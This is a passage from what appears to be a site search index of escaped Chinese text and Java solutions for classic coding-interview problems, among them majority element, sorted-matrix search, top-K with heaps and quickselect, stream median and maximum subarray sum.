\u6765\u89E3\u51B3\u8FD9\u4E2A\u95EE\u9898\uFF0C\u4F7F\u5F97\u65F6\u95F4\u590D\u6742\u5EA6\u4E3A O(N)\u3002
\u4F7F\u7528 cnt \u6765\u7EDF\u8BA1\u4E00\u4E2A\u5143\u7D20\u51FA\u73B0\u7684\u6B21\u6570\uFF0C\u5F53\u904D\u5386\u5230\u7684\u5143\u7D20\u548C\u7EDF\u8BA1\u5143\u7D20\u76F8\u7B49\u65F6\uFF0C\u4EE4 cnt++\uFF0C\u5426\u5219\u4EE4 cnt--\u3002\u5982\u679C\u524D\u9762\u67E5\u627E\u4E86 i \u4E2A\u5143\u7D20\uFF0C\u4E14 cnt == 0\uFF0C\u8BF4\u660E\u524D i \u4E2A\u5143\u7D20\u6CA1\u6709 majority\uFF0C\u6216\u8005\u6709 majority\uFF0C\u4F46\u662F\u51FA\u73B0\u7684\u6B21\u6570\u5C11\u4E8E i / 2 \uFF0C\u56E0\u4E3A\u5982\u679C\u591A\u4E8E i / 2 \u7684\u8BDD cnt \u5C31\u4E00\u5B9A\u4E0D\u4F1A\u4E3A 0 \u3002\u6B64\u65F6\u5269\u4E0B\u7684 n - i \u4E2A\u5143\u7D20\u4E2D\uFF0Cmajority \u7684\u6570\u76EE\u4F9D\u7136\u591A\u4E8E (n - i) / 2\uFF0C\u56E0\u6B64\u7EE7\u7EED\u67E5\u627E\u5C31\u80FD\u627E\u51FA majority\u3002
public int MoreThanHalfNum_Solution(int[] nums) { int majority = nums[0]; for (int i = 1, cnt = 1; i < nums.length; i++) { cnt = nums[i] == majority ? cnt + 1 : cnt - 1; if (cnt == 0) { majority = nums[i]; cnt = 1; } } int cnt = 0; for (int val : nums) if (val == majority) cnt++; return cnt > nums.length / 2 ? majority : 0;
}`}]},{path:"/%E9%A2%98%E8%A7%A3/4.%20%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84%E4%B8%AD%E7%9A%84%E6%9F%A5%E6%89%BE.html",title:"4. \u4E8C\u7EF4\u6570\u7EC4\u4E2D\u7684\u67E5\u627E",pathLocale:"/",contents:[{header:"4. \u4E8C\u7EF4\u6570\u7EC4\u4E2D\u7684\u67E5\u627E",slug:"_4-\u4E8C\u7EF4\u6570\u7EC4\u4E2D\u7684\u67E5\u627E",content:""},{header:"\u9898\u76EE\u94FE\u63A5",slug:"\u9898\u76EE\u94FE\u63A5",content:"\u725B\u5BA2\u7F51"},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:`\u7ED9\u5B9A\u4E00\u4E2A\u4E8C\u7EF4\u6570\u7EC4\uFF0C\u5176\u6BCF\u4E00\u884C\u4ECE\u5DE6\u5230\u53F3\u9012\u589E\u6392\u5E8F\uFF0C\u4ECE\u4E0A\u5230\u4E0B\u4E5F\u662F\u9012\u589E\u6392\u5E8F\u3002\u7ED9\u5B9A\u4E00\u4E2A\u6570\uFF0C\u5224\u65AD\u8FD9\u4E2A\u6570\u662F\u5426\u5728\u8BE5\u4E8C\u7EF4\u6570\u7EC4\u4E2D\u3002
Consider the following matrix:
[ [1, 4, 7, 11, 15], [2, 5, 8, 12, 19], [3, 6, 9, 16, 22], [10, 13, 14, 17, 24], [18, 21, 23, 26, 30]
] Given target = 5, return true.
Given target = 20, return false.`},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`\u8981\u6C42\u65F6\u95F4\u590D\u6742\u5EA6 O(M + N)\uFF0C\u7A7A\u95F4\u590D\u6742\u5EA6 O(1)\u3002\u5176\u4E2D M \u4E3A\u884C\u6570\uFF0CN \u4E3A \u5217\u6570\u3002
\u8BE5\u4E8C\u7EF4\u6570\u7EC4\u4E2D\u7684\u4E00\u4E2A\u6570\uFF0C\u5C0F\u4E8E\u5B83\u7684\u6570\u4E00\u5B9A\u5728\u5176\u5DE6\u8FB9\uFF0C\u5927\u4E8E\u5B83\u7684\u6570\u4E00\u5B9A\u5728\u5176\u4E0B\u8FB9\u3002\u56E0\u6B64\uFF0C\u4ECE\u53F3\u4E0A\u89D2\u5F00\u59CB\u67E5\u627E\uFF0C\u5C31\u53EF\u4EE5\u6839\u636E target \u548C\u5F53\u524D\u5143\u7D20\u7684\u5927\u5C0F\u5173\u7CFB\u6765\u5FEB\u901F\u5730\u7F29\u5C0F\u67E5\u627E\u533A\u95F4\uFF0C\u6BCF\u6B21\u51CF\u5C11\u4E00\u884C\u6216\u8005\u4E00\u5217\u7684\u5143\u7D20\u3002\u5F53\u524D\u5143\u7D20\u7684\u67E5\u627E\u533A\u95F4\u4E3A\u5DE6\u4E0B\u89D2\u7684\u6240\u6709\u5143\u7D20\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/35a8c711-0dc0-4613-95f3-be96c6c6e104.gif" width="400px">
public boolean Find(int target, int[][] matrix) { if (matrix == null || matrix.length == 0 || matrix[0].length == 0) return false; int rows = matrix.length, cols = matrix[0].length; int r = 0, c = cols - 1; // \u4ECE\u53F3\u4E0A\u89D2\u5F00\u59CB while (r <= rows - 1 && c >= 0) { if (target == matrix[r][c]) return true; else if (target > matrix[r][c]) r++; else c--; } return false;
}`}]},{path:"/%E9%A2%98%E8%A7%A3/40.%20%E6%9C%80%E5%B0%8F%E7%9A%84%20K%20%E4%B8%AA%E6%95%B0.html",title:"40. \u6700\u5C0F\u7684 K \u4E2A\u6570",pathLocale:"/",contents:[{header:"40. \u6700\u5C0F\u7684 K \u4E2A\u6570",slug:"_40-\u6700\u5C0F\u7684-k-\u4E2A\u6570",content:""},{header:"\u9898\u76EE\u94FE\u63A5",slug:"\u9898\u76EE\u94FE\u63A5",content:"\u725B\u5BA2\u7F51"},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:""},{header:"\u5927\u5C0F\u4E3A K \u7684\u6700\u5C0F\u5806",slug:"\u5927\u5C0F\u4E3A-k-\u7684\u6700\u5C0F\u5806",content:`\u590D\u6742\u5EA6\uFF1AO(NlogK) + O(K)
\u7279\u522B\u9002\u5408\u5904\u7406\u6D77\u91CF\u6570\u636E \u7EF4\u62A4\u4E00\u4E2A\u5927\u5C0F\u4E3A K \u7684\u6700\u5C0F\u5806\u8FC7\u7A0B\u5982\u4E0B\uFF1A\u4F7F\u7528\u5927\u9876\u5806\u3002\u5728\u6DFB\u52A0\u4E00\u4E2A\u5143\u7D20\u4E4B\u540E\uFF0C\u5982\u679C\u5927\u9876\u5806\u7684\u5927\u5C0F\u5927\u4E8E K\uFF0C\u90A3\u4E48\u5C06\u5927\u9876\u5806\u7684\u5806\u9876\u5143\u7D20\u53BB\u9664\uFF0C\u4E5F\u5C31\u662F\u5C06\u5F53\u524D\u5806\u4E2D\u503C\u6700\u5927\u7684\u5143\u7D20\u53BB\u9664\uFF0C\u4ECE\u800C\u4F7F\u5F97\u7559\u5728\u5806\u4E2D\u7684\u5143\u7D20\u90FD\u6BD4\u88AB\u53BB\u9664\u7684\u5143\u7D20\u6765\u5F97\u5C0F\u3002
\u5E94\u8BE5\u4F7F\u7528\u5927\u9876\u5806\u6765\u7EF4\u62A4\u6700\u5C0F\u5806\uFF0C\u800C\u4E0D\u80FD\u76F4\u63A5\u521B\u5EFA\u4E00\u4E2A\u5C0F\u9876\u5806\u5E76\u8BBE\u7F6E\u4E00\u4E2A\u5927\u5C0F\uFF0C\u4F01\u56FE\u8BA9\u5C0F\u9876\u5806\u4E2D\u7684\u5143\u7D20\u90FD\u662F\u6700\u5C0F\u5143\u7D20\u3002
Java \u7684 PriorityQueue \u5B9E\u73B0\u4E86\u5806\u7684\u80FD\u529B\uFF0CPriorityQueue \u9ED8\u8BA4\u662F\u5C0F\u9876\u5806\uFF0C\u53EF\u4EE5\u5728\u5728\u521D\u59CB\u5316\u65F6\u4F7F\u7528 Lambda \u8868\u8FBE\u5F0F (o1, o2) -> o2 - o1 \u6765\u5B9E\u73B0\u5927\u9876\u5806\u3002\u5176\u5B83\u8BED\u8A00\u4E5F\u6709\u7C7B\u4F3C\u7684\u5806\u6570\u636E\u7ED3\u6784\u3002
public ArrayList<Integer> GetLeastNumbers_Solution(int[] nums, int k) { if (k > nums.length || k <= 0) return new ArrayList<>(); PriorityQueue<Integer> maxHeap = new PriorityQueue<>((o1, o2) -> o2 - o1); for (int num : nums) { maxHeap.add(num); if (maxHeap.size() > k) maxHeap.poll(); } return new ArrayList<>(maxHeap);
}`},{header:"\u5FEB\u901F\u9009\u62E9",slug:"\u5FEB\u901F\u9009\u62E9",content:`\u590D\u6742\u5EA6\uFF1AO(N) + O(1)
\u53EA\u6709\u5F53\u5141\u8BB8\u4FEE\u6539\u6570\u7EC4\u5143\u7D20\u65F6\u624D\u53EF\u4EE5\u4F7F\u7528 \u5FEB\u901F\u6392\u5E8F\u7684 partition() \u65B9\u6CD5\uFF0C\u4F1A\u8FD4\u56DE\u4E00\u4E2A\u6574\u6570 j \u4F7F\u5F97 a[l..j-1] \u5C0F\u4E8E\u7B49\u4E8E a[j]\uFF0C\u4E14 a[j+1..h] \u5927\u4E8E\u7B49\u4E8E a[j]\uFF0C\u6B64\u65F6 a[j] \u5C31\u662F\u6570\u7EC4\u7684\u7B2C j \u5927\u5143\u7D20\u3002\u53EF\u4EE5\u5229\u7528\u8FD9\u4E2A\u7279\u6027\u627E\u51FA\u6570\u7EC4\u7684\u7B2C K \u4E2A\u5143\u7D20\uFF0C\u8FD9\u79CD\u627E\u7B2C K \u4E2A\u5143\u7D20\u7684\u7B97\u6CD5\u79F0\u4E3A\u5FEB\u901F\u9009\u62E9\u7B97\u6CD5\u3002
public ArrayList<Integer> GetLeastNumbers_Solution(int[] nums, int k) { ArrayList<Integer> ret = new ArrayList<>(); if (k > nums.length || k <= 0) return ret; findKthSmallest(nums, k - 1); /* findKthSmallest \u4F1A\u6539\u53D8\u6570\u7EC4\uFF0C\u4F7F\u5F97\u524D k \u4E2A\u6570\u90FD\u662F\u6700\u5C0F\u7684 k \u4E2A\u6570 */ for (int i = 0; i < k; i++) ret.add(nums[i]); return ret;
} public void findKthSmallest(int[] nums, int k) { int l = 0, h = nums.length - 1; while (l < h) { int j = partition(nums, l, h); if (j == k) break; if (j > k) h = j - 1; else l = j + 1; }
} private int partition(int[] nums, int l, int h) { int p = nums[l]; /* \u5207\u5206\u5143\u7D20 */ int i = l, j = h + 1; while (true) { while (i != h && nums[++i] < p) ; while (j != l && nums[--j] > p) ; if (i >= j) break; swap(nums, i, j); } swap(nums, l, j); return j;
} private void swap(int[] nums, int i, int j) { int t = nums[i]; nums[i] = nums[j]; nums[j] = t;
}`}]},{path:"/%E9%A2%98%E8%A7%A3/41.1%20%E6%95%B0%E6%8D%AE%E6%B5%81%E4%B8%AD%E7%9A%84%E4%B8%AD%E4%BD%8D%E6%95%B0.html",title:"41.1 \u6570\u636E\u6D41\u4E2D\u7684\u4E2D\u4F4D\u6570",pathLocale:"/",contents:[{header:"41.1 \u6570\u636E\u6D41\u4E2D\u7684\u4E2D\u4F4D\u6570",slug:"_41-1-\u6570\u636E\u6D41\u4E2D\u7684\u4E2D\u4F4D\u6570",content:""},{header:"\u9898\u76EE\u94FE\u63A5",slug:"\u9898\u76EE\u94FE\u63A5",content:"\u725B\u5BA2\u7F51"},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:"\u5982\u4F55\u5F97\u5230\u4E00\u4E2A\u6570\u636E\u6D41\u4E2D\u7684\u4E2D\u4F4D\u6570\uFF1F\u5982\u679C\u4ECE\u6570\u636E\u6D41\u4E2D\u8BFB\u51FA\u5947\u6570\u4E2A\u6570\u503C\uFF0C\u90A3\u4E48\u4E2D\u4F4D\u6570\u5C31\u662F\u6240\u6709\u6570\u503C\u6392\u5E8F\u4E4B\u540E\u4F4D\u4E8E\u4E2D\u95F4\u7684\u6570\u503C\u3002\u5982\u679C\u4ECE\u6570\u636E\u6D41\u4E2D\u8BFB\u51FA\u5076\u6570\u4E2A\u6570\u503C\uFF0C\u90A3\u4E48\u4E2D\u4F4D\u6570\u5C31\u662F\u6240\u6709\u6570\u503C\u6392\u5E8F\u4E4B\u540E\u4E2D\u95F4\u4E24\u4E2A\u6570\u7684\u5E73\u5747\u503C\u3002"},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`/* \u5927\u9876\u5806\uFF0C\u5B58\u50A8\u5DE6\u534A\u8FB9\u5143\u7D20 */
private PriorityQueue<Integer> left = new PriorityQueue<>((o1, o2) -> o2 - o1);
/* \u5C0F\u9876\u5806\uFF0C\u5B58\u50A8\u53F3\u534A\u8FB9\u5143\u7D20\uFF0C\u5E76\u4E14\u53F3\u534A\u8FB9\u5143\u7D20\u90FD\u5927\u4E8E\u5DE6\u534A\u8FB9 */
private PriorityQueue<Integer> right = new PriorityQueue<>();
/* \u5F53\u524D\u6570\u636E\u6D41\u8BFB\u5165\u7684\u5143\u7D20\u4E2A\u6570 */
private int N = 0; public void Insert(Integer val) { /* \u63D2\u5165\u8981\u4FDD\u8BC1\u4E24\u4E2A\u5806\u5B58\u4E8E\u5E73\u8861\u72B6\u6001 */ if (N % 2 == 0) { /* N \u4E3A\u5076\u6570\u7684\u60C5\u51B5\u4E0B\u63D2\u5165\u5230\u53F3\u534A\u8FB9\u3002 * \u56E0\u4E3A\u53F3\u534A\u8FB9\u5143\u7D20\u90FD\u8981\u5927\u4E8E\u5DE6\u534A\u8FB9\uFF0C\u4F46\u662F\u65B0\u63D2\u5165\u7684\u5143\u7D20\u4E0D\u4E00\u5B9A\u6BD4\u5DE6\u534A\u8FB9\u5143\u7D20\u6765\u7684\u5927\uFF0C * \u56E0\u6B64\u9700\u8981\u5148\u5C06\u5143\u7D20\u63D2\u5165\u5DE6\u534A\u8FB9\uFF0C\u7136\u540E\u5229\u7528\u5DE6\u534A\u8FB9\u4E3A\u5927\u9876\u5806\u7684\u7279\u70B9\uFF0C\u53D6\u51FA\u5806\u9876\u5143\u7D20\u5373\u4E3A\u6700\u5927\u5143\u7D20\uFF0C\u6B64\u65F6\u63D2\u5165\u53F3\u534A\u8FB9 */ left.add(val); right.add(left.poll()); } else { right.add(val); left.add(right.poll()); } N++;
} public Double GetMedian() { if (N % 2 == 0) return (left.peek() + right.peek()) / 2.0; else return (double) right.peek();
}`}]},{path:"/%E9%A2%98%E8%A7%A3/41.2%20%E5%AD%97%E7%AC%A6%E6%B5%81%E4%B8%AD%E7%AC%AC%E4%B8%80%E4%B8%AA%E4%B8%8D%E9%87%8D%E5%A4%8D%E7%9A%84%E5%AD%97%E7%AC%A6.html",title:"41.2 \u5B57\u7B26\u6D41\u4E2D\u7B2C\u4E00\u4E2A\u4E0D\u91CD\u590D\u7684\u5B57\u7B26",pathLocale:"/",contents:[{header:"41.2 \u5B57\u7B26\u6D41\u4E2D\u7B2C\u4E00\u4E2A\u4E0D\u91CD\u590D\u7684\u5B57\u7B26",slug:"_41-2-\u5B57\u7B26\u6D41\u4E2D\u7B2C\u4E00\u4E2A\u4E0D\u91CD\u590D\u7684\u5B57\u7B26",content:""},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:"\u725B\u5BA2\u7F51"},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0-1",content:'\u8BF7\u5B9E\u73B0\u4E00\u4E2A\u51FD\u6570\u7528\u6765\u627E\u51FA\u5B57\u7B26\u6D41\u4E2D\u7B2C\u4E00\u4E2A\u53EA\u51FA\u73B0\u4E00\u6B21\u7684\u5B57\u7B26\u3002\u4F8B\u5982\uFF0C\u5F53\u4ECE\u5B57\u7B26\u6D41\u4E2D\u53EA\u8BFB\u51FA\u524D\u4E24\u4E2A\u5B57\u7B26 "go" \u65F6\uFF0C\u7B2C\u4E00\u4E2A\u53EA\u51FA\u73B0\u4E00\u6B21\u7684\u5B57\u7B26\u662F "g"\u3002\u5F53\u4ECE\u8BE5\u5B57\u7B26\u6D41\u4E2D\u8BFB\u51FA\u524D\u516D\u4E2A\u5B57\u7B26\u201Cgoogle" \u65F6\uFF0C\u7B2C\u4E00\u4E2A\u53EA\u51FA\u73B0\u4E00\u6B21\u7684\u5B57\u7B26\u662F "l"\u3002'},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`\u4F7F\u7528\u7EDF\u8BA1\u6570\u7EC4\u6765\u7EDF\u8BA1\u6BCF\u4E2A\u5B57\u7B26\u51FA\u73B0\u7684\u6B21\u6570\uFF0C\u672C\u9898\u6D89\u53CA\u5230\u7684\u5B57\u7B26\u4E3A\u90FD\u4E3A ASCII \u7801\uFF0C\u56E0\u6B64\u4F7F\u7528\u4E00\u4E2A\u5927\u5C0F\u4E3A 128 \u7684\u6574\u578B\u6570\u7EC4\u5C31\u80FD\u5B8C\u6210\u6B21\u6570\u7EDF\u8BA1\u4EFB\u52A1\u3002
\u4F7F\u7528\u961F\u5217\u6765\u5B58\u50A8\u5230\u8FBE\u7684\u5B57\u7B26\uFF0C\u5E76\u5728\u6BCF\u6B21\u6709\u65B0\u7684\u5B57\u7B26\u4ECE\u5B57\u7B26\u6D41\u5230\u8FBE\u65F6\u79FB\u9664\u961F\u5217\u5934\u90E8\u90A3\u4E9B\u51FA\u73B0\u6B21\u6570\u4E0D\u518D\u662F\u4E00\u6B21\u7684\u5143\u7D20\u3002\u56E0\u4E3A\u961F\u5217\u662F\u5148\u8FDB\u5148\u51FA\u987A\u5E8F\uFF0C\u56E0\u6B64\u961F\u5217\u5934\u90E8\u7684\u5143\u7D20\u4E3A\u7B2C\u4E00\u6B21\u53EA\u51FA\u73B0\u4E00\u6B21\u7684\u5B57\u7B26\u3002
private int[] cnts = new int[128];
private Queue<Character> queue = new LinkedList<>(); public void Insert(char ch) { cnts[ch]++; queue.add(ch); while (!queue.isEmpty() && cnts[queue.peek()] > 1) queue.poll();
} public char FirstAppearingOnce() { return queue.isEmpty() ? '#' : queue.peek();
}`}]},{path:"/%E9%A2%98%E8%A7%A3/42.%20%E8%BF%9E%E7%BB%AD%E5%AD%90%E6%95%B0%E7%BB%84%E7%9A%84%E6%9C%80%E5%A4%A7%E5%92%8C.html",title:"42. \u8FDE\u7EED\u5B50\u6570\u7EC4\u7684\u6700\u5927\u548C",pathLocale:"/",contents:[{header:"42. \u8FDE\u7EED\u5B50\u6570\u7EC4\u7684\u6700\u5927\u548C",slug:"_42-\u8FDE\u7EED\u5B50\u6570\u7EC4\u7684\u6700\u5927\u548C",content:"NowCoder"},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:"{6, -3, -2, 7, -15, 1, 2, 2}\uFF0C\u8FDE\u7EED\u5B50\u6570\u7EC4\u7684\u6700\u5927\u548C\u4E3A 8\uFF08\u4ECE\u7B2C 0 \u4E2A\u5F00\u59CB\uFF0C\u5230\u7B2C 3 \u4E2A\u4E3A\u6B62\uFF09\u3002"},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`public int FindGreatestSumOfSubArray(int[] nums) { if (nums == null || nums.length == 0) return 0; int greatestSum = Integer.MIN_VALUE; int sum = 0; for (int val : nums) { sum = sum <= 0 ? val : sum + val; greatestSum = Math.max(greatestSum, sum); } return greatestSum;
}`}]},{path:"/%E9%A2%98%E8%A7%A3/43.%20%E4%BB%8E%201%20%E5%88%B0%20n%20%E6%95%B4%E6%95%B0%E4%B8%AD%201%20%E5%87%BA%E7%8E%B0%E7%9A%84%E6%AC%A1%E6%95%B0.html",title:"43. \u4ECE 1 \u5230 n \u6574\u6570\u4E2D 1 \u51FA\u73B0\u7684\u6B21\u6570",pathLocale:"/",contents:[{header:"43. \u4ECE 1 \u5230 n \u6574\u6570\u4E2D 1 \u51FA\u73B0\u7684\u6B21\u6570",slug:"_43-\u4ECE-1-\u5230-n-\u6574\u6570\u4E2D-1-\u51FA\u73B0\u7684\u6B21\u6570",content:"NowCoder"},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`public int NumberOf1Between1AndN_Solution(int n) { int cnt = 0; for (int m = 1; m <= n; m *= 10) { int a = n / m, b = n % m; cnt += (a + 8) / 10 * m + (a % 10 == 1 ? b + 1 : 0); } return cnt;
} Leetcode : 233. Number of Digit One`}]},{path:"/%E9%A2%98%E8%A7%A3/44.%20%E6%95%B0%E5%AD%97%E5%BA%8F%E5%88%97%E4%B8%AD%E7%9A%84%E6%9F%90%E4%B8%80%E4%BD%8D%E6%95%B0%E5%AD%97.html",title:"44. \u6570\u5B57\u5E8F\u5217\u4E2D\u7684\u67D0\u4E00\u4F4D\u6570\u5B57",pathLocale:"/",contents:[{header:"44. \u6570\u5B57\u5E8F\u5217\u4E2D\u7684\u67D0\u4E00\u4F4D\u6570\u5B57",slug:"_44-\u6570\u5B57\u5E8F\u5217\u4E2D\u7684\u67D0\u4E00\u4F4D\u6570\u5B57",content:""},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:"\u6570\u5B57\u4EE5 0123456789101112131415... \u7684\u683C\u5F0F\u5E8F\u5217\u5316\u5230\u4E00\u4E2A\u5B57\u7B26\u4E32\u4E2D\uFF0C\u6C42\u8FD9\u4E2A\u5B57\u7B26\u4E32\u7684\u7B2C index \u4F4D\u3002"},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`public int getDigitAtIndex(int index) { if (index < 0) return -1; int place = 1; // 1 \u8868\u793A\u4E2A\u4F4D\uFF0C2 \u8868\u793A \u5341\u4F4D... while (true) { int amount = getAmountOfPlace(place); int totalAmount = amount * place; if (index < totalAmount) return getDigitAtIndex(index, place); index -= totalAmount; place++; }
} /** * place \u4F4D\u6570\u7684\u6570\u5B57\u7EC4\u6210\u7684\u5B57\u7B26\u4E32\u957F\u5EA6 * 10, 90, 900, ... */
private int getAmountOfPlace(int place) { if (place == 1) return 10; return (int) Math.pow(10, place - 1) * 9;
} /** * place \u4F4D\u6570\u7684\u8D77\u59CB\u6570\u5B57 * 0, 10, 100, ... */
private int getBeginNumberOfPlace(int place) { if (place == 1) return 0; return (int) Math.pow(10, place - 1);
} /** * \u5728 place \u4F4D\u6570\u7EC4\u6210\u7684\u5B57\u7B26\u4E32\u4E2D\uFF0C\u7B2C index \u4E2A\u6570 */
private int getDigitAtIndex(int index, int place) { int beginNumber = getBeginNumberOfPlace(place); int shiftNumber = index / place; String number = (beginNumber + shiftNumber) + ""; int count = index % place; return number.charAt(count) - '0';
}`}]},{path:"/%E9%A2%98%E8%A7%A3/45.%20%E6%8A%8A%E6%95%B0%E7%BB%84%E6%8E%92%E6%88%90%E6%9C%80%E5%B0%8F%E7%9A%84%E6%95%B0.html",title:"45. \u628A\u6570\u7EC4\u6392\u6210\u6700\u5C0F\u7684\u6570",pathLocale:"/",contents:[{header:"45. \u628A\u6570\u7EC4\u6392\u6210\u6700\u5C0F\u7684\u6570",slug:"_45-\u628A\u6570\u7EC4\u6392\u6210\u6700\u5C0F\u7684\u6570",content:""},{header:"\u9898\u76EE\u94FE\u63A5",slug:"\u9898\u76EE\u94FE\u63A5",content:"\u725B\u5BA2\u7F51"},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:"\u8F93\u5165\u4E00\u4E2A\u6B63\u6574\u6570\u6570\u7EC4\uFF0C\u628A\u6570\u7EC4\u91CC\u6240\u6709\u6570\u5B57\u62FC\u63A5\u8D77\u6765\u6392\u6210\u4E00\u4E2A\u6570\uFF0C\u6253\u5370\u80FD\u62FC\u63A5\u51FA\u7684\u6240\u6709\u6570\u5B57\u4E2D\u6700\u5C0F\u7684\u4E00\u4E2A\u3002\u4F8B\u5982\u8F93\u5165\u6570\u7EC4 {3\uFF0C32\uFF0C321}\uFF0C\u5219\u6253\u5370\u51FA\u8FD9\u4E09\u4E2A\u6570\u5B57\u80FD\u6392\u6210\u7684\u6700\u5C0F\u6570\u5B57\u4E3A 321323\u3002"},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`\u53EF\u4EE5\u770B\u6210\u662F\u4E00\u4E2A\u6392\u5E8F\u95EE\u9898\uFF0C\u5728\u6BD4\u8F83\u4E24\u4E2A\u5B57\u7B26\u4E32 S1 \u548C S2 \u7684\u5927\u5C0F\u65F6\uFF0C\u5E94\u8BE5\u6BD4\u8F83\u7684\u662F S1+S2 \u548C S2+S1 \u7684\u5927\u5C0F\uFF0C\u5982\u679C S1+S2 < S2+S1\uFF0C\u90A3\u4E48\u5E94\u8BE5\u628A S1 \u6392\u5728\u524D\u9762\uFF0C\u5426\u5219\u5E94\u8BE5\u628A S2 \u6392\u5728\u524D\u9762\u3002
public String PrintMinNumber(int[] numbers) { if (numbers == null || numbers.length == 0) return ""; int n = numbers.length; String[] nums = new String[n]; for (int i = 0; i < n; i++) nums[i] = numbers[i] + ""; Arrays.sort(nums, (s1, s2) -> (s1 + s2).compareTo(s2 + s1)); String ret = ""; for (String str : nums) ret += str; return ret;
}`}]},{path:"/%E9%A2%98%E8%A7%A3/46.%20%E6%8A%8A%E6%95%B0%E5%AD%97%E7%BF%BB%E8%AF%91%E6%88%90%E5%AD%97%E7%AC%A6%E4%B8%B2.html",title:"46. \u628A\u6570\u5B57\u7FFB\u8BD1\u6210\u5B57\u7B26\u4E32",pathLocale:"/",contents:[{header:"46. \u628A\u6570\u5B57\u7FFB\u8BD1\u6210\u5B57\u7B26\u4E32",slug:"_46-\u628A\u6570\u5B57\u7FFB\u8BD1\u6210\u5B57\u7B26\u4E32",content:"Leetcode"},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:"\u7ED9\u5B9A\u4E00\u4E2A\u6570\u5B57\uFF0C\u6309\u7167\u5982\u4E0B\u89C4\u5219\u7FFB\u8BD1\u6210\u5B57\u7B26\u4E32\uFF1A1 \u7FFB\u8BD1\u6210\u201Ca\u201D\uFF0C2 \u7FFB\u8BD1\u6210\u201Cb\u201D... 26 \u7FFB\u8BD1\u6210\u201Cz\u201D\u3002\u4E00\u4E2A\u6570\u5B57\u6709\u591A\u79CD\u7FFB\u8BD1\u53EF\u80FD\uFF0C\u4F8B\u5982 12258 \u4E00\u5171\u6709 5 \u79CD\uFF0C\u5206\u522B\u662F abbeh\uFF0Clbeh\uFF0Caveh\uFF0Cabyh\uFF0Clyh\u3002\u5B9E\u73B0\u4E00\u4E2A\u51FD\u6570\uFF0C\u7528\u6765\u8BA1\u7B97\u4E00\u4E2A\u6570\u5B57\u6709\u591A\u5C11\u79CD\u4E0D\u540C\u7684\u7FFB\u8BD1\u65B9\u6CD5\u3002"},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`public int numDecodings(String s) { if (s == null || s.length() == 0) return 0; int n = s.length(); int[] dp = new int[n + 1]; dp[0] = 1; dp[1] = s.charAt(0) == '0' ? 0 : 1; for (int i = 2; i <= n; i++) { int one = Integer.valueOf(s.substring(i - 1, i)); if (one != 0) dp[i] += dp[i - 1]; if (s.charAt(i - 2) == '0') continue; int two = Integer.valueOf(s.substring(i - 2, i)); if (two <= 26) dp[i] += dp[i - 2]; } return dp[n];
}`}]},{path:"/%E9%A2%98%E8%A7%A3/47.%20%E7%A4%BC%E7%89%A9%E7%9A%84%E6%9C%80%E5%A4%A7%E4%BB%B7%E5%80%BC.html",title:"47. \u793C\u7269\u7684\u6700\u5927\u4EF7\u503C",pathLocale:"/",contents:[{header:"47. \u793C\u7269\u7684\u6700\u5927\u4EF7\u503C",slug:"_47-\u793C\u7269\u7684\u6700\u5927\u4EF7\u503C",content:"NowCoder"},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:`\u5728\u4E00\u4E2A m*n \u7684\u68CB\u76D8\u7684\u6BCF\u4E00\u4E2A\u683C\u90FD\u653E\u6709\u4E00\u4E2A\u793C\u7269\uFF0C\u6BCF\u4E2A\u793C\u7269\u90FD\u6709\u4E00\u5B9A\u4EF7\u503C\uFF08\u5927\u4E8E 0\uFF09\u3002\u4ECE\u5DE6\u4E0A\u89D2\u5F00\u59CB\u62FF\u793C\u7269\uFF0C\u6BCF\u6B21\u5411\u53F3\u6216\u5411\u4E0B\u79FB\u52A8\u4E00\u683C\uFF0C\u76F4\u5230\u53F3\u4E0B\u89D2\u7ED3\u675F\u3002\u7ED9\u5B9A\u4E00\u4E2A\u68CB\u76D8\uFF0C\u6C42\u62FF\u5230\u793C\u7269\u7684\u6700\u5927\u4EF7\u503C\u3002\u4F8B\u5982\uFF0C\u5BF9\u4E8E\u5982\u4E0B\u68CB\u76D8
1 10 3 8
12 2 9 6
5 7 4 11
3 7 16 5
\u793C\u7269\u7684\u6700\u5927\u4EF7\u503C\u4E3A 1+12+5+7+7+16+5=53\u3002`},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`\u5E94\u8BE5\u7528\u52A8\u6001\u89C4\u5212\u6C42\u89E3\uFF0C\u800C\u4E0D\u662F\u6DF1\u5EA6\u4F18\u5148\u641C\u7D22\uFF0C\u6DF1\u5EA6\u4F18\u5148\u641C\u7D22\u8FC7\u4E8E\u590D\u6742\uFF0C\u4E0D\u662F\u6700\u4F18\u89E3\u3002
